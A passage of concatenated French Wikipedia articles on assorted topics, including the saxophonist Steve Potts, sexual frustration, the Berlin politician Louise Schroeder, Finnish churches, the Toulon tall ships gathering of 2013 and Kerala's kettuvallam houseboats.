L'église avec ses vieilles granges est restée au milieu du centre-ville densément peuplé.
La sacristie est située à l'angle nord-est.
La nef est couverte de cinq coupoles voûtées d'égale hauteur et dotées d'un anneau central et de poutres.
Les parties centrales de l'intérieur de l'église ont été offertes par Casper Wrede, détenteur du fief d'Elimäki, et son épouse Sofia Taube.
Ils comprennent une jubé de style baroque de 1666, un retable avec de 1632 et une chaire.
Le retable peint en 1632 a été apporté par Casper Wrede, propriétaire du manoir de Peippola, de la guerre de Trente Ans.
Les peintures murales ont été réalisées par Valentin Betge en 1679.
Voir aussi.
Références.
 

</doc>
<doc id="7278397" url="https://fr.wikipedia.org/wiki?curid=7278397" title="Steve Potts">
Steve Potts

Steve Potts (né le à Columbus (Ohio)) est un saxophoniste américain de jazz, installé à Paris depuis les années 1970. Jouant le plus souvent du saxophone alto, et occasionnellement du soprano, Steve Potts est aussi connu pour avoir accompagné Steve Lacy durant une trentaine d'années.
Parcours.
Cousin du saxophoniste ténor et clarinettiste Buddy Tate, Steve Potts étudie l'architecture à Los Angeles, tout en prenant des leçons de saxophone avec Charles Lloyd. La rencontre avec Charles Lloyd est décisive, dans sa décision de se lancer dans une carrière musicale. Il se rend ensuite à New York où il écoute Eric Dolphy. Il y joue également avec Roy Ayers, Richard Davis, Joe Henderson, Reggie Workman, et Chico Hamilton.
En 1970, il se rend en Europe et s'installe à Paris, comme toute une génération de joueurs de free jazz américains] trouvant plus facile d'être un musicien noir en Europe qu'aux États-Unis. Il y joue avec Dexter Gordon, Johnny Griffin, Mal Waldron, Ben Webster, Hal Singer, Christian Escoudé, Boulou Ferré, Slide Hampton, et Oliver Johnson. Vers 1973, il y rencontre Steve Lacy et l'accompagne dans ses formations durant une trentaine d'années.
 dit Steve Lacy de cette collaboration en 1979. Ensemble, ils sont de tous les festivals et de toutes les expériences.
Dans les années 2000, Steve Potts a longtemps joué dans les clubs de jazz parisiens et notamment au Sept-Lézards. Il a participé aussi à la création de musiques de films.
Influences.
Son phrasé vient d'avant le bebop, de Lester Young, même s'il a beaucoup aimé la musique d'un Charlie Parker. Il a été également influencé par John Coltrane, Eric Dolphy, Frank Strozier et Henry Threadgill.
Discographie.
Comme accompagnateur.
Avec Steve Lacy :

</doc>
<doc id="7278412" url="https://fr.wikipedia.org/wiki?curid=7278412" title="Frustration sexuelle">
Frustration sexuelle

La frustration sexuelle, de manière générale, décrit le sentiment d'une personne qui ressent une insatisfaction sexuelle, sur un point spécifique ou dans un aspect global, à des degrés et des échelles de temps très variables.
La misère sexuelle est un type de frustration sexuelle.
Causes.
De très nombreuses causes d'empêchement des pulsions sexuelles et d'expression de la libido existent.
La frustration sexuelle peut par exemple faire suite à une virginité prolongée, à une inactivité sexuelle subie, à un contexte d'insatisfaction sexuelle, à une interruption lors d'une relation sexuelle, à l'attente du retour d'un partenaire éloigné.
La pulsion sexuelle peut aussi ne pas pouvoir s'exprimer à cause d'un médicament (notamment iatrogène), ou suite à une privation de liberté (notamment dans les contextes d'isolement social, spécifiquement par rapport aux personnes de sexe ou genre jugé attirant, ce qui est en particulier vrai des contextes non-mixtes pour les personnes hétérosexuelles, dans les contextes d'institutions éducatives et religieuses, ou encore du service militaire, dans l'équipage d'un navire au long cours, ou en prison, même si ), une hospitalisation ou mise en institution, un handicap physique ou autre chronique ou ponctuel, des problèmes de douleur chronique, un stress psychologique, etc. La frustration sexuelle et l'isolement social sont souvent liés à des facteurs de précarité économique et résidentielle.
Conséquences.
La frustration sexuelle est souvent associée à la solitude et source de stress, de dépression, d'anxiété voire d'agressivité et de violence (dirigées contre autrui et soi-même, automutilation, suicide). Elle peut également mener à des troubles sexuels (par exemple : masturbation excessive, addiction à la pornographie).
Le terme peut également décrire une excitation sexuelle frustrante en l'absence d'un orgasme.
Initialement, la théorie psychanalytique de Sigmund Freud estimait que le caractère pathogène de la frustration sexuelle était la source de la névrose d'angoisse (on parle maintenant d'anxiété généralisée ou de trouble panique). Selon Freud, la pulsion sexuelle ne pouvant disparaître ni se décharger, elle devient source d'angoisse.
La frustration sexuelle est notamment source d'une douleur morale, cause fréquente d'effets psychologiques ou physiologiques néfastes.
Elle peut mener à des troubles psychosomatiques et développer une irritabilité, une dépression qui rendent plus difficile la rencontre avec d’autres partenaires, ce qui entretient un cercle vicieux de frustration. Des actes violents peuvent également en résulter ou des comportements tels que la criminalité sexuelle (en tant que coupable, ou victime) dans les cas les plus graves.
Enjeux.
La non-frustration sexuelle ou la gestion d'épisodes d'une telle frustration sont des enjeux de qualité de vie individuelle et collective, de santé mentale et de santé sexuelle, et donc de l'accès au bonheur de vivre.
Wilhem Reich, ancien élève du psychanalyste Sigmund Freud, soutient que Il s'accorde à dire que la frustration sexuelle paralyse l'exercice de la conscience sociale et que la répression sexuelle trouverait son fondement dans des problèmes d'ordre socio-économique.
Tendances démographiques, historiques et géographiques.
Étude américaine (2000-2018).
Dans une étude menée auprès d'adultes américains de 2000 à 2018, l'activité sexuelle (avec autrui) a diminué chez les hommes et les femmes âgés de et de au cours de la période d'étude.
Chez les hommes, un revenu plus faible est associé à une plus faible activité sexuelle, tandis qu'un nombre plus élevé d'heures de travail est associé à une plus forte activité sexuelle, y compris chez les hommes travaillant plus de 40h par semaine. Ces associations ne se retrouvent pas chez les femmes. Le statut d'étudiant, homme ou femme, est associé à une plus faible activité sexuelle, tandis que l'usage de pornographie, le statut marital et la stabilité du partenaire, homme ou femme, est associé à une plus forte activité sexuelle.
Cas particuliers.
Le sex-ratio.
Dans certains pays, en Chine notamment, le sex-ratio des nouveau-nés est artificiellement modifié au profit d'une proportion anormalement basse de filles, et élevée de garçons, par les avortements sexo-sélectifs qui éliminent des fœtus féminins. Les hommes hétérosexuels de ces générations devenues adultes ont des difficultés particulières à trouver des partenaires.
Sur la planète, les femmes vivent généralement plus longtemps que leurs époux, ce qui est souvent pour elles, après la mort de ces derniers, une source de frustration et/ou d'inhibition sexuelles.
Manque d'accès à la contraception.
Le non-accès ou l'accès difficile à l'éducation à la sexualité, aux moyens de contraception et de planification des naissances peut conduire de nombreuses personnes (pauvres notamment) à constamment ou périodiquement réfréner leurs pulsions sexuelles, ce qui est source de frustration ; il en va de même pour la promotion du coït avec retrait.
Contexte de guerre.
Par exemple, à propos de la Première guerre mondiale, .
Contextes culturels et religieux.
De nombreuses religions prescrivent des tabous et des interdictions de nature sexuelle, allant jusqu'à l'abstinence sexuelle (volontaire voire imposée). Certaines religions ou religiosités imposent à tout ou partie de leurs pratiquants ou de la population, parfois avec violence et par les armes, de fortes restrictions ou des orientations sexuelles et rôles genrés spécifiques. Ces contextes pèsent davantage sur la population féminine et excluent de nombreuses minorités sexuelles et de genre, voire les criminalisent, là où le pouvoir religieux se mêle aux pouvoirs politique et judiciaire.
Dans certaines communautés, des questions dites d'honneur familial et de réputation assignent les femmes, filles, sœurs à l'absence de sexualité avant le mariage, à résidence au domicile et/ou au port de vêtements les cachant plus ou moins dans l’espace public. Ce type de contexte est également une source de frustration sexuelle, pour les jeunes femmes notamment, mais aussi indirectement pour les jeunes hommes hétérosexuels de leur communauté, tandis que les orientations non hétéronormatives sont spécifiquement réprouvées.
Mariage arrangé ou forcé.
Le mariage arrangé ou forcé, dans un contexte civil, familial ou religieux (généralement patriarcal et de phallocratie), d'autant plus visant les personnes qui ne sont pas encore adultes, peut aussi être source de frustration sexuelle ; il en va de même dans les contextes d'interdiction ou de freins au divorce. La population féminine est alors plus généralement victime.
Populations marginalisées.
L'exclusion sociale par la pauvreté et l'isolement, en particulier pour les SDF, est un puissant facteur de frustration sexuelle. D'autres cas particuliers sont :
Les minorités sexuelles et de genre.
Dans l'ensemble des sociétés, avec des variations, les individus sont fortement assignés – dès leur naissance, voire dès l'échographie prénatale, et généralement pour la vie – à un sexe, dès lors associé à un genre, et à chaque genre sont attribués des présupposés de rôles sexués et sexuels socialement prégnants et déterminants.
Cette assignation genrée liée au cissexisme peut plus ou moins correspondre ou non à l'identité de genre ressentie par l'individu, qui peut aussi se découvrir une orientation sexuelle correspondant ou non à ce qui est acceptable du point de vue hétéronormatif. Selon son identité de genre et son orientation sexuelle, il sera plus ou moins facilement inclus ou marginalisé dans la société.
Appartenir à une minorité sexuelle et de genre (LGBTQ : personnes lesbiennes, gaies, bisexuelles, trans et queer) semblerait accroître le risque d'exclusion de la vie sociale et rendrait l'épanouissement sexuel plus tardif et plus difficile. . Le risque de frustration est encore accru si la personne présente d'autres facteurs de stigmatisation, de discrimination ou de rejet, par exemple des malformations, un handicap physique, mental et/ou autre, des caractères autistiques ou neurodivergents, et/ou une appartenance ou origine religieuse, culturelle ou ethnique marginalisée.
Les personnes vivant avec des troubles du spectre de l'autisme (TSA).
Depuis que Robert Stoller a en 1964 formulé la notion d'identité de genre (« "" »), on distingue de plus en plus le genre de l'orientation sexuelle. Et depuis la fin des années 1990, parallèlement au études de genre, en particulier aux travaux sur la diversité sexuelle et de genre, sur l'identité de genre, sur le rôle de genre et plus généralement sur le genre dans les sciences sociales, un nombre croissant d'enquêtes et d'études scientifiques ont été dédiées à la question de l'autisme et de la neurodiversité au sein des différentes minorités de genre et de sexualité. Dans ce contexte, divers auteurs, intervenants et organisations militantes explorent la question des influences réciproques entre expérience vécue de l’autisme et influence du genre : existe-t-il, et si oui dans quelle mesure et avec quelles conséquences, des liens significatifs entre identité de genre, orientation sexuelle et autisme ? Les modèles théoriques disponibles (sociopsychologiques ou autres) expliquent-ils ces liens ? Quelle est l'expérience vécue par les personnes autistes qui s'identifient membres de la communauté LGBTQ et comment mieux la prendre en compte dans les démarches de reconnaissance et d'accompagnement des caractères autistiques ?
Ces travaux sont compliqués par les débats sur les conceptualisations sociopsychiatriques de l’autisme d'une part, et sur celles des minorités de genre et de sexualité d'autre part. Mais il ressort des revues d'études faites dans les années 2000-2010 que les identifications hors de l'hétérosexualité exclusive sont plus fréquentes chez les personnes neuroatypiques et qu'. Ces relations entre autisme, identité de genre et orientation sexuelle sont actuellement des cooccurrences démontrées, et non des relations de causalité prouvées. Selon Laflamme et Chamberland, sur la base d'une revue de la littérature publiée en 2020, la quantification et la compréhension de ces liens (occurrences, causalité ?) nécessitent d'affiner la connaissance du sujet, qui est facilement confronté à des limites méthodologiques, mais aussi à des conceptions diverses et parfois réductrices de la diversité neurologique, sexuelle et de genre.
Ce constat laisse penser qu'il existe une aggravation des difficultés quotidiennes pour les personnes à la fois autistes et LGBTQ. Des recommandations émergent au sein de la littérature académique comme au sein de la littérature militante pour aider ces personnes souvent doublement stigmatisées, en promouvant et pratiquant par exemple une plus grande ouverture à la diversité sexuelle, à la pluralité des genres et à la neurodiversité dans l'éducation à la sexualité, la prévention des souffrances et abus, la création d'espaces sécuritaires...
Chez les sportifs.
Une idée, déjà présente dans la Grèce antique, est qu'une frustration sexuelle imposée ou auto-imposée avant une compétition (avant une bataille chez le soldat) rendrait le sportif (masculin) plus fort, plus agressif, plus concentré et donc potentiellement plus performant. Il est fréquent que des entraîneurs et/ou dirigeants sportifs interdisent les conjoints et conjointes en période de stages préparatoires ou avant et pendant des compétitions. Par exemple, pour la Coupe du monde de football 2006, les joueurs de l'équipe nationale costaricienne n'ont pas pu se déplacer avec leurs conjointes. Le Tour de France interdit aux conjointes d'accompagner les cyclistes.
Si l'acte sexuel peut effectivement engendrer une dépense énergétique (plus ou moins importante selon sa durée et son intensité), l'interdire avant la pratique sportive peut aussi être source d'une frustration délétère.
Fétichisme sexuel.
Les individus fétichistes peuvent également ressentir de la frustration sexuelle, car se sentant anormaux. Paradoxalement, l'inverse peut être vrai, et les deux phénomènes peuvent aller de pair, la frustration sexuelle pouvant souvent inconsciemment forcer un individu à développer une paraphilie. Le "Manuel diagnostique et statistique des troubles mentaux" ("DSM-IV-TR") classifie les paraphilies comme 

</doc>
<doc id="7278413" url="https://fr.wikipedia.org/wiki?curid=7278413" title="Louise Schroeder">
Louise Schroeder

Louise Dorothea Sophie Schroeder, née le à Altona, morte le à Berlin, est une femme politique du Parti social démocrate d'Allemagne, bourgmestre-gouverneur de Berlin au début du blocus de la ville. Elle fait partie des 41 premières femmes membres de l'Assemblée nationale de Weimar et siège ensuite au Reichstag jusqu'en 1933. Elle est députée au Bundestag de 1949 à 1957. Elle est engagée dans les questions sociales et l'égalité pour les femmes. Une loi de 1927 sur la protection de la maternité porte son nom « "lex Schroeder" ».
Biographie.
Jeunesse et débuts en politique.
Louise Dorothea Sophie Schroeder est née le 2 avril 1887 à Altona dans une famille modeste. Son père, Karl August Julius Schroeder (1856- 1923), est un ouvrier du bâtiment et sa mère, Dorothea Amalie Maria Husteden (1843-1933), est une vendeuse de légumes. Grâce à une aide financière de parents, elle peut fréquenter l'école secondaire et obtenir son abitur. Elle est ensuite employée comme sténographe par une compagnie d'assurance tout en poursuivant ses études en cours du soir. 
Elle s'implique très tôt dans le mouvement ouvrier, rejoint le Parti social-démocrate en 1910 et travaille dans les domaines de la politique sociale et de l'égalité pour les femmes. C'est en participant aux soirées féminines de la section locale d'Altona-Ottensen qu'elle développe les talents oratoires qui contribuent rapidement à sa notoriété. 
Entre 1915 et 1918, elle est élue au bureau de la section. 
Députée.
Après la Révolution de Novembre, le Conseil des commissaires du peuple accorde aux femmes le droit de vote et d'éligibilité. Louise Schroeder est élue parmi les plus jeunes membres et parmi les 41 premières députées de l'Assemblée nationale de Weimar. 
Elle siège ensuite sans interruption au Reichstag de 1920 à 1933.
Membre de la commission des affaires sociales du Reichstag, elle joue un rôle décisif dans les avancées de la législation sociale, notamment les lois visant à protéger les travailleuses. Elle milite pour de meilleures mesures en matière de protection de la maternité, de protection de l'enfance, l'égalité des droits entre hommes et femmes et le droit des femmes à un emploi rémunéré. Elle prône également l'égalité de traitement pour les mères célibataires et les enfants nés hors mariage, notamment contre la discrimination à leur encontre dans le droit de la fonction publique et demande l'égalité pour les femmes dans la vie professionnelle, dans le mariage et dans la famille.
Louise Schroeder participe également aux travaux visant à abolir la réglementation de la prostitution.
La loi sur la protection de la maternité et des mères ("Mutterschutzgesetz") de 1927 est communément appelée « "lex Schroeder" ».
L'Arbeiterwohlfahrt.
En 1919, Louise Schroeder cofonde avec Marie Juchacz l'Arbeiterwohlfahrt (AWO) et, en 1925 elle est cofondatrice et chargée de cours de l'école sociale AWO à Berlin. Elle est aussi conférencière à la Deutschen Hochschule für Politik, aujourd'hui Institut Otto-Suhr, lié à l'université libre de Berlin. 
Sous le régime nazi.
En 1933, elle vote avec son groupe parlementaire, les sociaux démocrates, contre la loi accordant les pleins pouvoirs à Adolf Hitler. De ce fait, elle perd tous ses postes et fait l'objet d'une surveillance par la Gestapo. 
Le Parti social-démocrate et l'AWO sont désormais interdits et l'école sociale est fermée. Louise Schroeder est convoquée à plusieurs reprises pour des interrogatoires et, bien qu'elle soit sans emploi, les allocations de chômage lui sont refusées. Elle tient alors une boulangerie à Altona, qui sert aussi à la diffusion de messages clandestins. Elle pratique aussi une résistance passive en ne faisant pas le salut hitlérien. Pour sa sécurité, elle retourne à Berlin où elle trouve un emploi, grâce à son ami Paul Löbe, dans une entreprise de construction. Son employeur la soutient et la protège et l'envoie un temps au Danemark. Durant cette période, elle continue de fréquenter les cercles sociaux-démocrates clandestins de Hambourg puis de Berlin. 
Après la guerre.
Victime à plusieurs reprises des bombardements, malade et physiquement affaiblie, elle survit à la guerre et se remet immédiatement au travail en 1945. Elle participe à la reconstruction du SPD, est vice-présidente de la section de Berlin et siège au bureau fédéral du parti de 1946 à 1957. En 1946, elle remet sur pied l’"Arbeiterwohlfahrt".
Elle s'engage avec Helene Weber, de la Démocratie chrétienne, dans la formation politique. Elles enseignent notamment l’art oratoire aux jeunes femmes de leurs partis. 
De 1946 à 1950, elle publie, avec Otto Suhr, le magazine bimensuel théorique "Das sozialistische Jahrhundert" à Berlin.
Première femme bourgmestre de Berlin.
En mai 1947, Louise Schröder devient la bourgmestre intérimaire de Berlin, la première femme à ce poste, en remplacement d'Otto Ostrowski puis d'Ernst Reuter. De décembre 1948 à janvier 1951, elle est maire-adjointe de la ville. 
Comme maire de Berlin, Louise Schroeder affronte le blocus de la ville - les Soviétiques bloquent toutes les voies de circulation vers Berlin et arrêtent ainsi l'approvisionnement de la population -, doit gérer la pénurie générale et assurer la reconstruction d'une ville en ruines. Elle mène une politique sociale axée sur des besoins très matériels, qui semblent éloignés des intérêts de la « haute politique ». Même si pour cela, elle est parvenue à mobiliser les maires des grandes villes occidentales et à obtenir des aides financières de la part des Alliés, sa capacité et son envergure politique sont parfois contestées par le monde politique masculin. Son expertise dans les affaires sociales et la santé publique ne changent rien à cette perception, ces domaines étant considérés comme « féminins ». 
Dans son analyse de l'image de Louise Schroeder dans la presse à cette époque, Agathe Bernier-Monod note que le titre de « "Mère de Berlin" » que lui attribue volontiers les journaux en Allemagne de l'Ouest la renvoie souvent aux représentations traditionnelles de son genre. Elle est cependant une des personnalités allemandes les plus populaires de l'après-guerre. En mai 1949, après la fin du blocus, un grand rassemblement réunit les personnalités politiques, parmi lesquelles Konrad Adenauer et Carlo Schmid, mais aucun temps de parole n'est prévu pour Louise Schroeder, jusqu'à ce que la foule la réclame.
Députée au Bundestag.
Louise Schroeder devient membre du gouvernement à gérance municipale puis de la Chambre des députés de Berlin jusqu'en 1949.
Elle est députée du land de Berlin au Bundestag allemand de 1949 jusqu'à sa mort en 1957. Pendant la même période, elle siège à l'Assemblée parlementaire du Conseil de l'Europe.
En raison de son expérience politique, elle accepte de rejoindre le Sénat de Berlin à l'initiative d'Otto Suhr. 
En 1949, on la présente comme une candidate du SPD pour la présidence fédérale d'Allemagne face à Theodor Heuss, mais son parti lui préfère finalement Kurt Schumacher. 
Louise Schroeder décède le 4 juin 1957 à l'âge de 70 ans. À sa mort, des milliers de personnes descendent dans les rues pour lui rendre un dernier hommage. Son urne est enterrée au cimetière Holstenkamp à Hambourg-Bahrenfeld, dans une tombe d'honneur. 
Distinctions.
De nombreux établissements portent le nom de Louise Schroeder : une salle de sport à Berlin-Wedding, des lycées à Munich, à Berlin-Lichterfelde, des écoles primaires à Berlin-Spandau, Niedenstein et dans sa ville natale de Hambourg-Altona, ainsi qu'un établissement mère-enfant AWO à Keitum et une maison de retraite à Berlin-Mariendorf.
Des rues et des places portent également le nom de Louise Schroeder à Bremerhaven, Hambourg-Altona-Altstadt, Hanau, Hanovre, Oldenbourg et Wipperfürth, avec l'orthographe Louise Schröder à Bergkamen, Hagen, Mühlacker et Wennigsen. Il y a des chemins Louise Schröder à Darmstadt, Kaltenkirchen, Monheim am Rhein et Neu-Anspach, des chemins Louise-Schroeder à Illingen (Wurtemberg), Karlsruhe-Durlach, Langenhagen, Lübeck et Rheinfelden, un chemin Louise-Schroeder à Norderstedt et une place Louise-Schroeder à Berlin-Wedding.
Depuis 1998, le Sénat de Berlin décerne chaque année, à l'occasion de l'anniversaire de Louise Schroeder, la Médaille Louise-Schroeder pour « services rendus à la démocratie, à la paix, à la justice sociale et à l'égalité entre les femmes et les hommes ».

</doc>
<doc id="7278415" url="https://fr.wikipedia.org/wiki?curid=7278415" title="Église de Geta">
Église de Geta

Léglise de Geta (en ) est une église située à Geta, sur l'île d'Åland, en Finlande.
Histoire.
L'église en granite rouge est construite probablement entre 1510 et 1540.
Voir aussi.
Liens externes.
 

</doc>
<doc id="7278428" url="https://fr.wikipedia.org/wiki?curid=7278428" title="Décembre 1955">
Décembre 1955



</doc>
<doc id="7278438" url="https://fr.wikipedia.org/wiki?curid=7278438" title="Faculté d'éducation spéciale et de réadaptation de l'université de Belgrade">
Faculté d'éducation spéciale et de réadaptation de l'université de Belgrade

La faculté d'éducation spéciale et de réadaptation de l'université de Belgrade (en serbe cyrillique : ; en serbe latin : "") est l'une des 31 facultés de l'université de Belgrade, la capitale de la Serbie. Elle a été fondée en 1975. En 2013, son doyen est le professeur Jasmina Kovačević.
Organisation.
La faculté est divisée en 7 départements :

</doc>
<doc id="7278442" url="https://fr.wikipedia.org/wiki?curid=7278442" title="Mes vingt-cinq jours">
Mes vingt-cinq jours

Mes vingt-cinq jours est une nouvelle de Guy de Maupassant, parue en 1885.
Historique.
"Mes vingt-cinq jours" est initialement publiée dans le quotidien "Gil Blas" du .
Résumé.
Journal d'un curiste venu passer vingt-cinq jours à Châtel-Guyon pour y soigner son foie, son estomac et maigrir un peu. La rencontre de deux jolies femmes agrémente le séjour...

</doc>
<doc id="7278445" url="https://fr.wikipedia.org/wiki?curid=7278445" title="Ozaki (homonymie)">
Ozaki (homonymie)

Ozaki est un patronyme japonais porté notamment par :

</doc>
<doc id="7278462" url="https://fr.wikipedia.org/wiki?curid=7278462" title="Saburō Kuroda">
Saburō Kuroda

, dans la préfecture de Hiroshima - , est un poète japonais.
Kuroda étudie l'économie à l'Université de Tokyo. Au cours de la Seconde Guerre mondiale, il est stationné à Java. À son retour, il fait partie avec Nobuo Ayukawa et Ryūichi Tamura des fondateurs de la revue littéraire "Arechi". Il fait paraître une demi-douzaine de recueils de poésies, parmi lesquels "Hitori no onna ni" (1954), "Chiisai Yuri to" (1960) et "Jidai no shūjin" (1965).

</doc>
<doc id="7278465" url="https://fr.wikipedia.org/wiki?curid=7278465" title="Toulon Voiles de Légende 2013">
Toulon Voiles de Légende 2013

Toulon Voiles de Légende 2013 est un rassemblement de grands voiliers organisé à la base navale de la "Vieille darse" dans la rade de Toulon, en mer Méditerranée durant la seconde édition de la "Mediterranean Tall Ships Regatta". C'est une des éditions de l'événement Toulon Voiles de Légende.
Présentation.
Le port de Toulon accueille pour la deuxième fois, du 27 au , une étape de la Tall Ships' Races lors de l'étape française de la "Mediterranean Tall Ships Regatta" 2013.
Cette course de grands voiliers se déroule en deux étapes :
Résultat de la première course :
Festivités.
Pour l'escale de la course 2013 cette nouvelle édition propose de nombreuses festivités : des bagad (comme celui du Centre d'instruction naval de Saint-Mandrier) et fanfares, des concerts, des spectacles de rue, sons et lumières, du cinéma en plein-air, un village de plus de avec des multiples animations et des espaces de restauration...Certains bateaux proposent des visites à leur bord du 27 au ...L'arrivée des grands voiliers est prévue entre le 26 et .Le au matin se déroule une cérémonie d'ouverture.La parade des équipages est prévue le , de l'avenue de la République à la Place d'Armes. Démonstrations et manœuvres de Yole de Bantry par l'association JEMVAR.Le en matinée une parade nautique clôture cet événement avant le départ de la 2° étape de la course au large de Porquerolles.
Bateaux inscrits.
Classement des bateaux selon la STI (Sail Training International).
Classe A.
Voiliers à phares carrés et autres de plus de 40 mètres de longueur de coque.
Classe B.
Voiliers à gréement traditionnel, moins de de longueur de coque et plus de de longueur de flottaison.
Classe C.
Voiliers à gréement moderne sans spinnaker, idem Classe B.
Classe D.
Voiliers à gréement moderne avec spinnaker, idem Classe B.
Voir aussi.
Articles connexes.
Autres manifestations dans le monde :

</doc>
<doc id="7278470" url="https://fr.wikipedia.org/wiki?curid=7278470" title="Haut-Asco">
Haut-Asco



</doc>
<doc id="7278475" url="https://fr.wikipedia.org/wiki?curid=7278475" title="Marie-Pierre Palayer">
Marie-Pierre Palayer

Marie-Pierre Palayer (aujourd'hui épouse Lescoeur), née le , est une pilote automobile lyonnaise de rallyes, rallye-raid, et sur circuits.
Biographie.
Elle a été pilote officielle des teams "BMW France" (jusqu'en 1969), "Porsche Sonauto BP" (1970), et "Aseptogyl" du grenoblois Robert Neyret (1971 -dès sa création- à 1973, sur Alpine A110 S puis Peugeot 504).
Sa carrière en compétition automobile s'arrête après le Nice-Abidjan-Nice (alors au volant d'un camion UNIC IVECO, compétition précurseur en France du rallye Paris-Dakar).
Liens externes.
 

</doc>
<doc id="7278479" url="https://fr.wikipedia.org/wiki?curid=7278479" title="Ngoko">
Ngoko

Ngoko est le nom d’un district du département de la Cuvette en République du Congo. Il est traversé par la rivière Ngoko, affluent du Kouyou, dont il porte le nom.

</doc>
<doc id="7278481" url="https://fr.wikipedia.org/wiki?curid=7278481" title="Kenneth Kiprop">
Kenneth Kiprop



</doc>
<doc id="7278482" url="https://fr.wikipedia.org/wiki?curid=7278482" title="Novembre 1955">
Novembre 1955

Fiction.
C'est le dans le film "Retour vers le futur" (1985), que le personnage de Marty McFly (interprété par Michael J. Fox) arrive pour la première fois dans le passé avec une machine à voyager dans le temps (la DeLorean).
Le samedi 12 novembre. Marty McFly arrivera à faire un retour vers le futur, grâce à son ami le docteur Emmett Brown en l’an 1985.

</doc>
<doc id="7278484" url="https://fr.wikipedia.org/wiki?curid=7278484" title="Andreea Ispas">
Andreea Ispas

Andreea Ispas est une joueuse roumaine de volley-ball née le à Tulcea. Elle mesure et joue au poste de libero. 

</doc>
<doc id="7278492" url="https://fr.wikipedia.org/wiki?curid=7278492" title="Kettuvallam">
Kettuvallam

Un (en malayalam : ; de ' (lier) et ' (bateau)), est un type de bateau originaire de l'État du Kerala, en Inde, grandement utilisé comme maison flottante ( en anglais) à vocation touristique. Il est composé d'une coque en bois et d'un toit de chaume.
Chaque "" est construit de manière artisanale par des charpentiers locaux avec du bois d"Anjili" lié avec de la fibre de coco. Une maison flottante peut avoir jusqu'à de long et transporter une charge allant jusqu'à . 
Histoire.
Le transport de matériel et de personnes dans les "backwaters" du Kerala se fait principalement par bateaux, dont les tailles et formes ont varié avec les époques. Les "kettuvallam" étaient à l'époque utilisés pour transporter le riz et des épices entre la région du Kuttanad et le port de Cochin. Ce transport demandait généralement trois jours. 
Le développement du réseau routier, ferroviaire et aérien a changé la donne, amenant les gens à considérer ce mode de transport fluvial lent et rassis. C'est à partir de que le "kettuvallam" est revalorisé à destination du tourisme, converti en maison flottante ou plus populairement "houseboat". Une initiative prise dans le district d'Alleppey par un tour-opérateur, en partenariat avec des artisans locaux, en vue de faciliter des séjours de longue durée dans la région. Les soutiens gouvernementaux, associatifs et du secteur privé contribueront à la préservation de l'artisanat local lié à la construction navale, devenu un élément conséquent dans le développement et la diversification économique de la région par le tourisme.
Construction.
Un ' fait généralement de long pour de large (au centre). Ils sont généralement construits avec des matériaux locaux tels de la fibre de coco, de la corde, des mâts et des tapis en bambou, etc. Le principal matériau utilisé est le bois d"Anjili" ('). La coque est composée de longues planches de bois courbées, liées ensemble avec de la fibre de coco. Le tout est par la suite enduit de résine noire caustique extraite de noix de cajou bouillies. Motorisé, le "" est piloté en eaux profondes à l'aide d'avirons. Des tiges en bambou placées sur les côtés de l'embarcation sont également utilisées dans ces situations. Le bambou est également utilisé dans la structure du toit.
À l'origine, le "" était conçu pour le transport de marchandises. Plusieurs modifications ont été faites pour en faire une embarcation touristique. Ainsi, la hauteur du toit a été augmentée pour permettre une meilleure circulation des passagers. Un plancher droit a été ajouté sur la coque courbe afin de faciliter la circulation ainsi que pour permettre de s'assoir confortablement. Des fenêtres et d'autres types d'ouvertures ont été ajoutées et l'entrée a été placée au centre, avec un solide panneau de bois.
La plupart des embarcations récentes sont conçues avec trois chambres avec toilettes, un espace commun et une cuisine. En général, des plateformes placées en porte-à-faux sur la coque servent de balcon.

</doc>
<doc id="7278494" url="https://fr.wikipedia.org/wiki?curid=7278494" title="Sugar Magnolia">
Sugar Magnolia

Sugar Magnolia est une chanson composée par Bob Weir et écrite par Robert Hunter. Cette chanson fait partie intégrante de l'Album du Grateful Dead "American Beauty", publié en 1970. 
La chanson est très vite devenue un standard de scène du groupe, qui l'a interprétée près de 600 fois sur scène au cours des vingt-cinq années qui ont suivi sa publication en version studio. En 1972, une version enregistrée sur scène à l'Olympia est publiée dans l'album Europe '72, puis en 1977 dans la vidéo, The Grateful Dead Movie. Dans les années 1970, la chanson est souvent interprétée juste avant le compte de minuit pour les concerts du nouvel an, comme en 1976, ou en 1978. Dans les années 1980, la chanson clôt souvent les concerts du groupe.

</doc>
<doc id="7278510" url="https://fr.wikipedia.org/wiki?curid=7278510" title="Kadéï">
Kadéï

La Kadéï est un affluent de la Sangha qui traverse le Cameroun et la République centrafricaine.
Géographie.
Elle prend sa source dans le massif de l'Adamaoua, au sud-est de Garoua-Boulaï. Elle reçoit deux affluents : la Doumé et la Boumbé, avant de s'orienter vers l'est. À Nola, elle rencontre la Sangha, parfois appelée Mambéré sur son cours supérieur.
Affluents.
La Kadéï reçoit successivement d'amont en aval : 

</doc>
<doc id="7278520" url="https://fr.wikipedia.org/wiki?curid=7278520" title="Canal d'Augustow">
Canal d'Augustow



</doc>
<doc id="7278525" url="https://fr.wikipedia.org/wiki?curid=7278525" title="Église de Jyväskylä">
Église de Jyväskylä

Léglise de Jyväskylä (en ) est une église située dans le quartier de Keskusta à Jyväskylä en Finlande.
Histoire.
L'église en briques est conçue par Ludvig Isak Lindqvist, les travaux de construction sont dirigés par Anders Johan Janzon et se terminent en 1880.
Le bâtiment remplace l’église en bois, conçue par Jaakonpoika Leppänen et construite en 1775, qui était située à l'endroit de l'actuel Parc Cygnaeus. 
La nouvelle église est attendue depuis les années 1850 à cause de la localisation et de l'état de dangerosité de l'ancienne.
En 1885, la construction de l'église de Taulumäki se termine et l'ancienne église en bois devenue inutile est détruite en 1888.
L'église de Jyväskylä est en brique et à l'époque de sa construction c'est la première église en dur de Finlande-Centrale.
Architecture.
L'architecture de l'église est remarquable par ses fenêtres arquées et la richesse de ses ornements en brique. 
L'architecture comprend des traits d'architecture romane et des traits de Style néogothique.
Elle est construite comme un tout avec la place du marché de l'époque et de nos jours elle est entourée du parc Kirkkopuisto.
Les peintures de la voûte en coquille sont de Bruno Tuukkanen qui a aussi conçu les peintures des vitraux en 1924. 
Le retable peint en 1901 par Fredrik Ahlstedt et Nina Ahlstedt représente "Jésus bénissant les enfants" (ou : "Laissez venir à moi les petits enfants.
L'église présente la première sculpture en finnois du mot Hosanna.
Voir aussi.
Liens externes.
 

</doc>
<doc id="7278534" url="https://fr.wikipedia.org/wiki?curid=7278534" title="Coupe d'Océanie de rugby à XV 2007">
Coupe d'Océanie de rugby à XV 2007

